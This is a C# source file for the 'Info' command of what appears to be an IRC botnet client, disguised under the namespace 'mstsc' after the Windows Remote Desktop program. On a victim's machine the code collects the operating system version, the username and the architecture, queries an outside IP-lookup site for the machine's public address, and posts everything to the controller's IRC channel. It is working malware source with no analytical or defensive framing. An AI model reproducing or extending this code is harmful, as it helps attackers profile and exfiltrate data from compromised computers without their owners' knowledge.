using System;
using Microsoft.Win32;

namespace mstsc.Aries.Commands
{
    sealed class Info
    {
        public Info()
        {
            try
            {
                RegistryKey CurrentVersion = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");

                string Response;
                try
                {
                    Response = new System.Net.WebClient().DownloadString("http://www.whatismyip.com/automation/n09230945.asp");
                }
                catch (Exception)
                {
                    Response = "Error retreiving IP";
                }

                Main.Instance.IRCClient.MessageCurrentChannel("{Info} " +
                    "Operating System: " + Environment.OSVersion.ToString() + "(" +
                    CurrentVersion.GetValue("ProductName") + " x" + (IntPtr.Size * 8).ToString() + 
                    "), Username: " + Environment.UserName +
                    ", IP Address: " + Response +
                    ", Bot Version: " + Config.Version);

                CurrentVersion.Close();
                GC.Collect();
            }
            catch (Exception Exception)
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{Info} An error has occurred: " + Exception.Message);
            }
        }
    }
}
